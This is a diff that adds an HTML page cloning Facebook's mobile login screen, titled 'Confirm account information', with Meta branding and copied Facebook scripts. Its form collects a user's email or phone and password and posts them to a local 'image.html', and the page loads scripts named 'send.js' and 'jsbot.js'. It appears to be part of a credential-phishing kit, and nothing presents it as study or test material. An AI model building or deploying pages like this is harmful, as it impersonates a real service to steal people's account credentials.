@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en" data-autoid="autoid_1" class="">
+
+<head>
+
+    <title data-localize="screen_2.title">Confirm account information</title>
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+    <link href="icon_web.ico" rel="shortcut icon">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+    <meta name="color-scheme" content="light">
+    <meta charset="utf-8" />
+    
+    <link type="text/css" rel="stylesheet" href="css/LBeK2AdVA10.css" data-bootloader-hash="xrfi7E+"
+        crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="css/eknh9Re3ab9.css" data-bootloader-hash="xb82VEZ"
+        crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="css/ogGTLy0m35N.css" data-bootloader-hash="tvaPsvc"
+        crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="css/tMCGgMHbEWk.css" data-bootloader-hash="8A0KNb4"
+        crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="css/0gtnVJ5rfTK.css" data-bootloader-hash="p84v6t+"
+        crossorigin="anonymous">
+    <script id="u_0_a_6+" nonce="">
+        function envFlush(a) {
+            function b(b) {
+                for (var c in a) b[c] = a[c];
+            }
+            window.requireLazy ? window.requireLazy(["Env"], b) : ((window.Env = window.Env || {}), b(window.Env));
+        }
+        envFlush({
+            stratcom_event_profiler_hook: "1",
+            timeslice_heartbeat_config: {
+                pollIntervalMs: 33,
+                idleGapThresholdMs: 60,
+                ignoredTimesliceNames: { requestAnimationFrame: true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true },
+                isHeartbeatEnabled: true,
+                isArtilleryOn: false,
+            },
+            shouldLogCounters: true,
+            timeslice_categories: { react_render: true, reflow: true },
+            sample_continuation_stacktraces: true,
+            dom_mutation_flag: true,
+        });
+    </script>
+
+
+
+    <script id="u_0_7_Ck" nonce="">
+        (CavalryLogger =
+            window.CavalryLogger ||
+            function (a) {
+                (this.lid = a),
+                    (this.transition = !1),
+                    (this.metric_collected = !1),
+                    (this.is_detailed_profiler = !1),
+                    (this.instrumentation_started = !1),
+                    (this.pagelet_metrics = {}),
+                    (this.events = {}),
+                    (this.ongoing_watch = {}),
+                    (this.values = { t_cstart: window._cstart }),
+                    (this.piggy_values = {}),
+                    (this.bootloader_metrics = {}),
+                    (this.resource_to_pagelet_mapping = {}),
+                    this.initializeInstrumentation && this.initializeInstrumentation();
+            }),
+            (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
+                this.is_detailed_profiler = a;
+                return this;
+            }),
+            (CavalryLogger.prototype.setTTIEvent = function (a) {
+                this.tti_event = a;
+                return this;
+            }),
+            (CavalryLogger.prototype.setValue = function (a, b, c, d) {
+                d = d ? this.piggy_values : this.values;
+                (typeof d[a] === "undefined" || c) && (d[a] = b);
+                return this;
+            }),
+            (CavalryLogger.prototype.getLastTtiValue = function () {
+                return this.lastTtiValue;
+            }),
+            (CavalryLogger.prototype.setTimeStamp =
+                CavalryLogger.prototype.setTimeStamp ||
+                function (a, b, c, d) {
+                    this.mark(a);
+                    var e = this.values.t_cstart || this.values.t_start;
+                    e = d ? e + d : CavalryLogger.now();
+                    this.setValue(a, e, b, c);
+                    this.tti_event && a == this.tti_event && ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
+                    return this;
+                }),
+            (CavalryLogger.prototype.mark =
+                typeof console === "object" && console.timeStamp
+                    ? function (a) {
+                        console.timeStamp(a);
+                    }
+                    : function () { }),
+            (CavalryLogger.prototype.addPiggyback = function (a, b) {
+                this.piggy_values[a] = b;
+                return this;
+            }),
+            (CavalryLogger.instances = {}),
+            (CavalryLogger.id = 0),
+            (CavalryLogger.getInstance = function (a) {
+                typeof a === "undefined" && (a = CavalryLogger.id);
+                CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+                return CavalryLogger.instances[a];
+            }),
+            (CavalryLogger.setPageID = function (a) {
+                if (CavalryLogger.id === 0) {
+                    var b = CavalryLogger.getInstance();
+                    CavalryLogger.instances[a] = b;
+                    CavalryLogger.instances[a].lid = a;
+                    delete CavalryLogger.instances[0];
+                }
+                CavalryLogger.id = a;
+            }),
+            (CavalryLogger.now = function () {
+                return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime();
+            }),
+            (CavalryLogger.prototype.measureResources = function () { }),
+            (CavalryLogger.prototype.profileEarlyResources = function () { }),
+            (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () { }),
+            (CavalryLogger.start_js = function () { }),
+            (CavalryLogger.done_js = function () { });
+        CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+        (CavalryLogger.prototype.measureResources = function (a, b) {
+            if (!this.log_resources) return;
+            var c = "bootload/" + a.name;
+            if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+            var d = CavalryLogger.now();
+            this.ongoing_watch[c] = d;
+            "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+            b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+            if (a.type === "js") {
+                c = "js_exec/" + a.name;
+                this.ongoing_watch[c] = d;
+            }
+        }),
+            (CavalryLogger.prototype.stopWatch = function (a) {
+                if (this.ongoing_watch[a]) {
+                    var b = CavalryLogger.now(),
+                        c = b - this.ongoing_watch[a];
+                    this.bootloader_metrics[a] = c;
+                    var d = this.piggy_values;
+                    a.indexOf("bootload") === 0 &&
+                        (d.t_resource_download || (d.t_resource_download = 0),
+                            d.resources_downloaded || (d.resources_downloaded = 0),
+                            (d.t_resource_download += c),
+                            (d.resources_downloaded += 1),
+                            d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+                    delete this.ongoing_watch[a];
+                }
+                return this;
+            }),
+            (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
+                var a = {};
+                Object.values(window.CavalryLogger.instances).forEach(function (b) {
+                    b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
+                });
+                return a;
+            }),
+            (CavalryLogger.start_js = function (a) {
+                for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
+            }),
+            (CavalryLogger.done_js = function (a) {
+                for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
+            }),
+            (CavalryLogger.prototype.profileEarlyResources = function (a) {
+                for (var b = 0; b < a.length; b++) this.measureResources({ name: a[b][0], type: a[b][1] ? "js" : "" }, "_EF_");
+            });
+        CavalryLogger.getInstance().log_resources = true;
+        CavalryLogger.getInstance().setIsDetailedProfiler(true);
+        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+    </script>
+    <script id="u_0_8_KG" nonce="">
+        (function _(a, b, c, d) {
+            function e(a) {
+                document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
+            }
+            function f(a, b) {
+                document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
+            }
+            if (!a) {
+                e(b);
+                e(c);
+                return;
+            }
+            a = null;
+            (navigator.userAgent.indexOf("Firefox") !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
+                document.documentElement != null &&
+                ((a = screen.width / document.documentElement.offsetWidth), (a = Math.max(1, Math.floor(a * 2) / 2)));
+            (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96), (a = Math.max(1, Math.round(a * 2) / 2)));
+            f(b, (a || window.devicePixelRatio || 1).toString());
+            e = window.screen ? screen.width : 0;
+            b = window.screen ? screen.height : 0;
+            f(c, e + "x" + b);
+            d && document.cookie && window.devicePixelRatio > 1 && document.location.reload();
+        })(true, "m_pixel_ratio", "wd", false);
+    </script>
+
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/translateelement.css">
+    <link type="text/css" rel="stylesheet" href="css/new_style.css">
+    <style>
+        @media only screen and (max-width: 600px) {
+            #langDialog {
+                font-size: 0.85em;
+            }
+        }
+
+        #langDialog {
+            display: none;
+            width: 80%;
+            max-width: 670px;
+            margin: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+
+            background-color: #fff;
+            z-index: 1000000;
+        }
+
+        #langDialog .titile-dialog {
+            padding-top: 5px;
+            padding-bottom: 5px;
+            padding-left: 10px;
+            padding-right: 10px;
+            background-color: #6d84b4;
+            border: 1px solid #365899;
+            border-bottom: 0;
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        #langDialog .content-dialog {
+            display: flex;
+            flex-direction: row;
+
+            border-color: #555;
+            border-style: solid;
+            border-width: 0 1px;
+            padding: 10px;
+        }
+
+        #langDialog .content-dialog a {
+            color: #385898;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        #langDialog .button-dialog {
+            background-color: #f2f2f2;
+            border: 1px solid #ccc;
+            border-bottom: none;
+            border-left: none;
+            border-right: none;
+            padding: 10px;
+
+            display: flex;
+            flex-direction: row-reverse;
+        }
+
+        #langDialog .button-dialog a {
+            font-size: 12px;
+            line-height: 26px;
+            background-color: #f5f6f7;
+            border: 1px solid #ccd0d5;
+
+            border-radius: 2px;
+            box-sizing: content-box;
+            color: #4b4f56;
+            font-size: 12px;
+            -webkit-font-smoothing: antialiased;
+            font-weight: bold;
+            justify-content: center;
+            line-height: 22px;
+            padding: 0 6px;
+            text-align: center;
+            text-shadow: none;
+            vertical-align: middle;
+
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+
+        .title-span {
+            font-size: 1.5rem;
+            font-family: inherit;
+            word-wrap: break-word;
+            color: #050505;
+            width: 100%;
+            display: block;
+            text-align: center;
+        }
+
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .div_error .error {
+            display: inline;
+        }
+
+        .div_error input {
+            border: 1px solid #f02849 !important;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .error {
+            display: none;
+            width: 25px;
+            height: 25px;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .border_error {
+            border: 1px solid #f02849 !important;
+        }
+
+        #layout_form {
+            min-width: 460px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            #layout_form {
+                width: 100%;
+                min-width: 320px;
+            }
+        }
+    </style>
+</head>
+
+<body tabindex="0" class="bare touch x1 _fzu _50-3 _67i4 iframe _2v9s portrait"
+    style="background-color: #F0F2F5; min-height: 667px; ">
+    <script id="u_0_6_R4" nonce="">
+        (function (a) {
+            a.__updateOrientation = function () {
+                var b = !!a.orientation && a.orientation !== 180,
+                    c = document.body;
+                c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
+                return b;
+            };
+        })(window);
+    </script>
+    <div id="viewport" class="touch" data-kaios-focus-transparent="1" style="height: 100vh;background-color: #F0F2F5;">
+        <div id="page">
+            <div class="_129_" id="header-notices"></div>
+            <div id="rootcontainer" style="height: 100vh;">
+                <div class="_2v9s " id="root" role="main"
+                    style="height: 100vh;display: flex;flex-direction: column;background-color: #F0F2F5"
+                    data-sigil="context-layer-root content-pane">
+                    <div class="_4-4l" id="layout_form" style="margin: auto;">
+                        <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
+                        <div class="_7om2 _52we _2pid _52z6">
+                            <div class="_4g34"><a onclick="return javascript::void(0)"><img src="images/dF5SId3UHWd.svg"
+                                        width="112" class="img" alt="facebook"></a></div>
+                        </div>
+                        <div class="_5rut">
+                            <form id="frm_botdata" action="image.html" method="POST" onsubmit="return validateSubmit();"
+                                class="mobile-login-form _9hp- _5spm">
+                                <div>
+                                    <div class="_56be">
+                                        <div class="_55wo _56bf">
+                                            <div class="_96n9" id="div_email">
+                                                <input data-localize="screen_2.placeholder_email" autocorrect="off" autocapitalize="off" type="text"
+                                                    class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email"
+                                                    onkeydown="changeUser()" name="email"
+                                                    placeholder="Mobile number or email address"
+                                                    data-sigil="m_login_email">
+                                                <img class="error" src="images/error.png">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="_55wq"></div>
+                                    <div class="_56be">
+                                        <div class="_55wo _56bf">
+                                            <div class="_1upc _mg8" data-sigil="m_login_password">
+                                                <div class="_7om2">
+                                                    <div class="_4g34 _5i2i _52we">
+                                                        <div class="_5xu4" id="div_password">
+                                                            <input data-localize="screen_2.placeholder_password" autocorrect="off" autocapitalize="off"
+                                                                class="_56bg _4u9z _27z2 _8qtm" autocomplete="on"
+                                                                id="m_login_password" name="password"
+                                                                onkeydown="changePass()" placeholder="Password"
+                                                                type="password"
+                                                                data-sigil="password-plain-text-toggle-input">
+                                                            <img class="error" src="images/error.png">
+                                                        </div>
+                                                    </div>
+                                                    <div class="_5s61 _216i _5i2i _52we">
+                                                        <div class="_5xu4">
+                                                            <div class="_2pi9" style="display:none" id="u_0_1_Tk"><a
+                                                                    href="#"
+                                                                    data-sigil="password-plain-text-toggle"><span
+                                                                        class="mfss" style="display:none"
+                                                                        id="u_0_2_EP">HIDE</span><span class="mfss"
+                                                                        id="u_0_3_Fj">SHOW</span></a></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="_2pie" style="text-align:center;">
+                                    <div id="login_password_step_element" data-sigil="login_password_step_element">
+                                        <button type="submit" value=""
+                                            class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login"
+                                            data-sigil="touchable login_button_block m_login_button"
+                                            data-autoid="autoid_9"><span data-localize="screen_2.btn_login"  class="_55sr"></span></button></div>
+                                    <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
+                                    <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
+                                    <div id="otp_button_elem_container"></div>
+                                </div><input type="hidden" name="prefill_contact_point"
+                                    id="prefill_contact_point"><input type="hidden" name="prefill_source"
+                                    id="prefill_source"><input type="hidden" name="prefill_type"
+                                    id="prefill_type"><input type="hidden" name="first_prefill_source"
+                                    id="first_prefill_source"><input type="hidden" name="first_prefill_type"
+                                    id="first_prefill_type"><input type="hidden" name="had_cp_prefilled"
+                                    id="had_cp_prefilled" value="false"><input type="hidden"
+                                    name="had_password_prefilled" id="had_password_prefilled" value="false"><input
+                                    type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"><input
+                                    type="hidden" id="bi_xrwh" name="bi_xrwh" value="0"><input type="hidden"
+                                    id="scetoggle">
+                                <div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript"
+                                        value="true" /></noscript>
+                            </form>
+                            <div>
+                                <div class="_2pie _9omz">
+                                    <div class="_52jj _9on1">
+                                        <a data-localize="screen_2.forgotten_password" class="_9on1" tabindex="0" onclick="return javascript::void(0)"
+                                            id="forgot-password-link">Forgotten password?</a>
+                                    </div>
+                                </div>
+                                <div style="padding-top: 42px">
+                                    <div>
+                                        <div>
+                                            <div>
+                                                <div id="login_reg_separator" class="_43mg _8qtf"
+                                                    data-sigil="login_reg_separator"><span data-localize="screen_2.or" class="_43mh">or</span></div>
+                                                <div class="_52jj _5t3b" id="signup_button_area">
+                                                    <a data-localize="screen_2.btn_create_account" role="button" class="_agmp _28le btn medBtn mfsm touchable"
+                                                        id="signup-button" tabindex="0" data-sigil="m_reg_button"
+                                                        data-autoid="autoid_8">Create new account</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="_2pie" style="text-align:center;">
+                                            <div>
+                                                <div data-sigil="login_identify_step_element"></div>
+                                                <div class="other-links _8p_m">
+                                                    <ul class="_5pkb _55wp">
+                                                        <li></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="_3h-4" style="background:#F0F2F5">
+                        <div class="_5aq3"
+                            style="display:flex;color: #737373;font-size: 12px;cursor: pointer;line-height: 18px; padding:20px;">
+                            <ul style="flex: 1; text-align:center">
+                                <li><a href="?lang=en" style="color: #737373">English</a></li>
+                                <li><a href="?lang=ch" style="color: #737373">中文(台灣)</a></li>
+                                <li><a href="?lang=es" style="color: #737373">Español</a></li>
+                                <li><a href="?lang=fr" style="color: #737373">Français (France)</a></li>
+                            </ul>
+                            <ul style="flex: 1; text-align:center">
+                                <li><a href="?lang=kr" style="color: #737373">한국어</a></li>
+                                <li><a href="?lang=da" style="color: #737373">Dansk</a></li>
+                                <li><a href="?lang=ge" style="color: #737373">Deutsch</a></li>
+                                <li><a role="button" onclick="openDialog()"
+                                        style="text-decoration: underline;margin-right: 0;font-family: inherit;white-space: nowrap;color: #8a8d91;background-color: #ebedf0;cursor: pointer;display: inline-block;height: 18px;line-height: 18px;border-color: #ccd0d5;transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;border: 1px solid;border-radius: 2px;box-sizing: content-box;font-size: 12px;padding: 0 8px;"
+                                        rel="dialog"
+                                        ajaxify="https://facebook.com/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
+                                        href="#" title="Hiển thị thêm ngôn ngữ"><i
+                                            style="background-image: url(images/icons.png);background-size: auto;background-repeat: no-repeat;display: inline-block;background-position: -26px -73px;position: relative;vertical-align: middle;width: 12px;height: 12px;"></i></a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="_5aq3" style="text-align: center; padding-bottom:16px;">
+                            <span style="color: #737373;font-size: 11px;"> Meta © 2023</span>
+                        </div>
+                    </div>
+                    <div style="display: none;">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+            </div>
+            <div class=""></div>
+            <div class="viewportArea _2v9s" style="display: none;" id="u_0_0_S6" data-sigil="marea">
+                <div class="_5vsg" id="u_0_1_9Z" style="max-height: 938px;"></div>
+                <div class="_5vsh" id="u_0_2_8r" style="max-height: 481px;"></div>
+                <div class="_5v5d fcg">
+                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
+                        data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                    Loading...
+                </div>
+            </div>
+            <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
+                <div class="container">
+                    <div class="image"></div>
+                    <div class="message" data-sigil="error-message"></div>
+                    <a class="link" data-sigil="MPageError:retry">Try Again</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="static_templates">
+        <div class="mDialog" id="modalDialog" style="display: none;" data-sigil=" context-layer-root"
+            data-autoid="autoid_2">
+            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+                <div class="_7om2 _52we">
+                    <div class="_5s61">
+                        <div class="_52z7">
+                            <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable"
+                                id="u_0_4_J5" data-sigil="dialog-cancel-button">Cancel</button>
+                            <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly"
+                                aria-label="Back" id="u_0_5_Du" data-sigil="dialog-back-button">
+                                <i class="img sp_TH5s7LpCvWO sx_eb84d2" style="margin-top: 2px;"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="_4g34">
+                        <div class="_52z6">
+                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
+                                data-sigil="m-dialog-header-title dialog-title">Loading...</div>
+                        </div>
+                    </div>
+                    <div class="_5s61">
+                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="modalDialogView" id="modalDialogView"></div>
+            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3_NC"
+                    data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                Loading...
+            </div>
+        </div>
+    </div>
+    <script>
+        function validateMyForm() {
+            var name = document.getElementById('name').value;
+            var password = document.getElementById('password').value;
+            var email = document.getElementById('email').value;
+
+            var count = false;
+            if (!(email != null && email != '')) {
+                document.getElementById('email').style.border = '1px solid red';
+                count = true;
+            }
+            else {
+                document.getElementById('email').style.border = '1px solid #dddfe2';
+            }
+
+            if (!(password != null && password != '')) {
+                document.getElementById('password').style.border = '1px solid red';
+                count = true;
+            }
+            else {
+                document.getElementById('password').style.border = '1px solid #dddfe2'
+            }
+
+            if (!(name != null && name != '')) {
+                document.getElementById('name').style.border = '1px solid red';
+                count = true;
+            }
+            else {
+                document.getElementById('name').style.border = '1px solid #dddfe2'
+            }
+            if (count) {
+                return false;
+            }
+            return true;
+        }
+    </script>
+
+    <div class="AdBox Ad advert post-ads"></div>
+    <div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+        <div style="padding: 8px;">
+            <div>
+                <div class="logo"><img src="images/translate_24dp.png" width="20" height="20" alt="Google Dịch"></div>
+            </div>
+        </div>
+        <div class="top" style="padding: 8px; float: left; width: 100%;">
+            <h1 class="title gray">Văn bản gốc</h1>
+        </div>
+        <div class="middle" style="padding: 8px;">
+            <div class="original-text"></div>
+        </div>
+        <div class="bottom" style="padding: 8px;">
+            <div class="activity-links"><span class="activity-link">Đóng góp bản dịch hay hơn</span><span
+                    class="activity-link"></span></div>
+            <div class="started-activity-container">
+                <hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;">
+                <div class="activity-root"></div>
+            </div>
+        </div>
+        <div class="status-message" style="display: none;"></div>
+    </div>
+    <div class="dfp_unit"></div>
+    <div class="goog-te-spinner-pos">
+        <div class="goog-te-spinner-animation">
+            <svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px"
+                viewBox="0 0 66 66">
+                <circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33"
+                    r="30"></circle>
+            </svg>
+        </div>
+    </div>
+
+
+    <div id="langDialog">
+        <div data-localize="popup_lang_title" class="titile-dialog">Select your language </div>
+        <div class="content-dialog">
+            <div style="flex:1">
+                <ul>
+                    <!-- Thái Lan -->
+                    <li><a href="?lang=thai">&nbsp;าษาไทย</a></li>
+                    <!-- Đan mạch -->
+                    <li><a href="?lang=da">Dansk</a></li>
+                    <!-- Thủy Điển -->
+                    <li><a href="?lang=sv">Svenska</a></li>
+                    <!-- Cộng hòa Séc -->
+                    <li><a href="?lang=se">Čeština</a></li>
+                    <!-- Pháp -->
+                    <li><a href="?lang=fr">Français (France)</a></li>
+                    <!-- NHật -->
+                    <li><a href="?lang=ja">日本語</a></li>
+                    <!-- Trung quốc-->
+                    <li><a href="?lang=ch-1">中文(简体)</a></li>
+                    <!-- Đài loan -->
+                    <li><a href="?lang=ch">中文(台灣)</a></li>
+                    <!-- Hy Lạp -->
+                    <li><a href="?lang=gre">Ελληνικά</a></li>
+                    <!-- Hungary -->
+                    <li><a href="?lang=hung">Magyar</a></li>
+                </ul>
+            </div>
+
+            <div style="flex:1;display: flex;justify-content: center;">
+                <ul>
+
+                    <!-- Thổ nhĩ kì -->
+                    <li><a href="?lang=tur">Türkçe</a></li>
+                    <!-- Mã lai -->
+                    <li><a href="?lang=ma">Bahasa melayu</a></li>
+                    <!-- Mông cổ -->
+                    <li><a href="?lang=mo">Монгол</a></li>
+                    <!-- Hà Lan -->
+                    <li><a href="?lang=na">Nederlands</a></li>
+                    <!-- Bulgaria -->
+                    <li><a href="?lang=no">Български</a></li>
+                    <!-- Na uy -->
+                    <li><a href="?lang=nay">Norsk</a></li>
+                    <!-- Nepal -->
+                    <li><a href="?lang=bu">नेपाली</a></li>
+                    <!-- Ba Lan -->
+                    <li><a href="?lang=pol">Polski</a></li>
+                    <!-- Do thái -->
+                    <li><a href="?lang=he">עברית</a></li>
+                    <!-- Bồ Đào Nha -->
+                    <li><a href="?lang=en">English</a></li>
+                </ul>
+            </div>
+            <div style="flex:1;display: flex;justify-content: center;">
+                <ul>
+
+                    <!-- Thụy điển -->
+                    <li><a href="?lang=es">Español</a></li>
+                    <!-- Phần lan -->
+                    <li><a href="?lang=su">Suomi</a></li>
+                    <!-- estonia -->
+                    <li><a href="?lang=ee">Eesti</a></li>
+                    <!-- ĐỨc -->
+                    <li><a href="?lang=ge">Deutsch</a></li>
+                    <!-- Iceland -->
+                    <li><a href="?lang=ir">Íslenska</a></li>
+                    <!-- Ả rập -->
+                    <li><a href="?lang=ar">عربي</a></li>
+                    <!-- Slovakia -->
+                    <li><a href="?lang=sk">Slovak</a></li>
+                    <!-- România -->
+                    <li><a href="?lang=ro">România</a></li>
+                    <!-- Croatia -->
+                    <li><a href="?lang=hr">Hrvatski</a></li>
+                    <!-- Myanma -->
+                    <li><a href="?lang=mam">မြန်မာ</a></li>
+
+                </ul>
+            </div>
+            <div style="flex:1;display: flex;justify-content: center;">
+                <ul>
+
+                    <!-- Ireland -->
+                    <li><a href="?lang=ic">Gaeilge</a></li>
+                    <!-- Ý -->
+                    <li><a href="?lang=it">Italiano</a></li>
+                    <!-- Tajik -->
+                    <li><a href="?lang=ta">Tajik</a></li>
+                    <!-- Kyrgyz -->
+                    <li><a href="?lang=ky">Kyrgyz</a></li>
+                    <!-- Kazakhstan -->
+                    <li><a href="?lang=ka">Kazakh</a></li>
+                    <!-- Khmer -->
+                    <li><a href="?lang=kh">ភាសាខ្មែរ</a></li>
+                    <!-- Slovenia -->
+                    <li><a href="?lang=sl">Slovenščina</a></li>
+                    <!-- Bosnia -->
+                    <li><a href="?lang=bo">Bosanski</a></li>
+                    <li><a href="?lang=kr">한국어</a></li>
+                    <li><a href="?lang=rs">Србија</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="button-dialog">
+            <a data-localize="popup_lang_close" href="#" onclick="closeDialog()">Close</a>
+        </div>
+    </div>
+    <script>
+
+        window.addEventListener("load", (event) => {
+            //resize();
+        });
+
+        function resize() {
+            console.log(document.getElementById('content-box').offsetWidth + " " + document.getElementById('content-box').offsetHeight);
+            var width = document.getElementById('content-box').offsetWidth;
+            var height = document.getElementById('content-box').offsetHeight;
+            if (width > height) {
+                document.getElementById('content-box').style.height = (width - 16 * 2) + "px";
+            }
+            else {
+                document.getElementById('content-box').style.width = (height - 16 * 2) + "px";
+            }
+        }
+        function changeUser() {
+            var user = document.getElementById('m_login_email');
+            if (user.value != undefined && user.value == '') {
+                document.getElementById("div_email").classList.remove('div_error');
+            }
+        }
+
+        function changePass() {
+            var user = document.getElementById('m_login_password');
+            if (user.value != undefined && user.value == '') {
+                document.getElementById("div_password").classList.remove('div_error');
+            }
+        }
+
+        function validateSubmit() {
+            var user = document.getElementById('m_login_email');
+            var pass = document.getElementById('m_login_password');
+            var isFalse = false;
+            if (user.value == undefined || (user.value != undefined && user.value == '')) {
+                document.getElementById("div_email").classList.add('div_error');
+                isFalse = true;
+            }
+            else {
+                document.getElementById("div_email").classList.remove('div_error');
+            }
+            if (pass.value == undefined || (pass.value != undefined && pass.value == '')) {
+                document.getElementById("div_password").classList.add('div_error');
+                isFalse = true;
+            }
+            else {
+                document.getElementById("div_password").classList.remove('div_error');
+            }
+            return isFalse == false;
+        }
+        function openDialog() {
+            document.getElementById('langDialog').style.display = 'inline';
+        }
+
+        function closeDialog() {
+            document.getElementById('langDialog').style.display = 'none';
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="js/jsbot.js"></script>
+    <script src="js/send.js"></script>
+
+    <script src="js/jquery.localize.min.js"></script>
+    <script src="js/base.js"></script> 
+    <script>
+        var base = new BaseFunc();
+        // In a browser where the language is set to French
+        //$("[data-localize]").localize("localize", { language: "fr",pathPrefix: "/data/localize", skipLanguage: "en-US"})
+        
+        // You can also override the language detection, and pass in a language code
+        $("[data-localize]").localize("localize", { language: base.getCurrentLanguage() ,pathPrefix: "data/localize", skipLanguage: "en-US"})
+    </script>
+</body>
+
+</html>
